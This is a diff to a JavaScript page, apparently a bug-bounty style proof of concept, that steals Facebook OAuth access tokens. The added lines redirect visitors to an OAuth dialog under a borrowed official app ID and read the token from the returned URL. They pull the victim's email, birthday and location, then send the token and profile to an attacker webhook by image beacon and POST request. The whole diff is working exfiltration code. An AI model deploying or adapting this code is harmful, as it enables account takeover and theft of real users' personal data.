@@ -12,22 +12,23 @@
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
 
                 try {
-                    // سحب الـ ID والبريد والاسم (كما فعل صمودة في خطوته الأولى)
-                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday&access_token=${token}`);
+                    // محاكاة استغلال صمودة: جلب البريد، الـ ID، وتاريخ الميلاد، ومعرف الجهاز إن أمكن
+                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday,location&access_token=${token}`);
                     const userData = await response.json();
 
-                    // إرسال الـ ID بوضوح (920929380607450) لتوثيقه
-                    new Image().src = `${webhookUrl}?FOUND_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}`;
+                    // إرسال البيانات المسربة فوراً (التي تثبت الأثر الضار كما طلب صمويل)
+                    const exfil = new Image();
+                    exfil.src = `${webhookUrl}?LEAKED_TOKEN=${token}&FB_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}`;
 
-                    // محاولة سحب معلومات الجهاز (Fingerprinting)
+                    // تسجيل بصمة الجهاز (Device Fingerprint) لإثبات إمكانية الـ ATO
                     await fetch(webhookUrl, {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify({
-                            impact: "Account Information Leak",
-                            facebook_id: userData.id,
-                            full_profile: userData,
-                            browser: navigator.userAgent
+                            type: "Sammouda-Style-Exploitation",
+                            token: token,
+                            account_info: userData,
+                            user_agent: navigator.userAgent
                         })
                     });
 
@@ -36,7 +37,8 @@
                     window.location.href = "https://www.facebook.com/me";
                 }
             } else {
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile";
+                // استخدام تطبيق فيسبوك الرسمي (Client ID: 124024574287414) لرفع قوة الاستغلال
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=124024574287414&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday";
             }
         };
     </script>
